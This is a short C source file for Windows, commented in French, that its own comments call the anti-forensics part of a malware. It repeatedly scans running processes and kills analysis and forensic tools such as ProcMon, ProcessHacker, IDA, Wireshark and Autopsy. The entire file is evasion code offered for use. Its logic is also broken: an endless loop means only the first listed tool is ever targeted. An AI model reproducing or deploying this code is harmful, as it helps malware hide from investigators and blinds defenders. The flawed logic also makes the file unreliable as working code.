#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdbool.h>

// Fonction pour lanti-forensics, ferme les processus spécifié en liste
void closeProcesses(const char* processName) {
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;

    while (1) {
        hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

        if (hProcessSnap == INVALID_HANDLE_VALUE) {
            printf("Valeur handle invalide.\n");
            Sleep(3000); // Attendre 3 secondes avant de vérifier encore
            continue;
        }

        pe32.dwSize = sizeof(PROCESSENTRY32);

        if (!Process32First(hProcessSnap, &pe32)) {
            printf("Erreur de récupération du premier processus.\n");
            CloseHandle(hProcessSnap);
            Sleep(3000); // Attendre 3 secondes avant de vérifier encore
            continue;
        }

        bool processFound = false;

        do {
            // Chercher le processus dans la liste spécifié
            if (strcmp(pe32.szExeFile, processName) == 0) {
                processFound = true;
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);

                if (hProcess != NULL) {
                    TerminateProcess(hProcess, 0);
                    CloseHandle(hProcess);
                    printf("%s a ete ferme.\n", processName);
                    break;
                }
            }
        } while (Process32Next(hProcessSnap, &pe32)); // Tant qu'il y a des processus encore t encore...

        CloseHandle(hProcessSnap);

        if (!processFound) {
            printf("%s n'est pas en cours d'exécution.\n", processName);
        }

        Sleep(3000); // Chrono de 3 secondes pour retourner dans la boucle
    }
}

int main() {

    // Liste des processus que le malware va fermer
    const char* processes[] = {"ProcMon.exe", "ProcessHacker.exe", "ida.exe", "cheatengine.exe", "wireshark.exe", "autopsy.exe"};

    for (int i = 0; i < sizeof(processes) / sizeof(processes[0]); ++i) {
        closeProcesses(processes[i]);
    }

    return 0;
}
